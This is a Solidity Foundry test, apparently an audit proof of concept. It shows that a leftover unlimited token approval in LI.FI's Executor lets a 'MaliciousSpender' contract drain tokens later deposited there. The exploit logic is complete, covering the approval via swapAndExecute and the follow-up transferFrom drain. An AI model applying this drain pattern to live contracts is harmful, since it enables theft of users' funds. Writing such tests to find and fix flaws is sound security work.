// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { Executor } from "lifi/Periphery/Executor.sol";
import { LibSwap } from "lifi/Libraries/LibSwap.sol";
import { TestToken } from "../utils/TestToken.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ERC20ProxyStub {
    function transferFrom(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract MaliciousSpender {
    function dummy() external {}
    function drain(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract LibSwapUnlimitedAllowanceTest is Test {
    Executor private executor;
    ERC20ProxyStub private proxy;
    TestToken private token;
    MaliciousSpender private attacker;

    function setUp() public {
        proxy = new ERC20ProxyStub();
        executor = new Executor(address(proxy), address(this));
        token = new TestToken("Token", "TKN", 18);
        token.mint(address(this), 10 ether);
        token.approve(address(proxy), type(uint256).max);
        attacker = new MaliciousSpender();
    }

    function test_UnlimitedAllowanceCanDrainFutureTokens() public {
        LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](1);
        swapData[0] = LibSwap.SwapData({
            callTo: address(attacker),
            approveTo: address(attacker),
            sendingAssetId: address(token),
            receivingAssetId: address(token),
            fromAmount: 1 ether,
            callData: abi.encodeWithSelector(MaliciousSpender.dummy.selector),
            requiresDeposit: false
        });

        bytes32 txId = keccak256("id");
        executor.swapAndExecute(
            txId,
            swapData,
            address(token),
            payable(address(this)),
            1 ether
        );

        // Simulate future token deposit into executor
        token.transfer(address(executor), 5 ether);

        // Attacker drains using leftover approval
        attacker.drain(address(token), address(executor), address(this), 5 ether);

        assertEq(token.balanceOf(address(executor)), 0);
        assertEq(token.balanceOf(address(this)), 10 ether);
    }
}

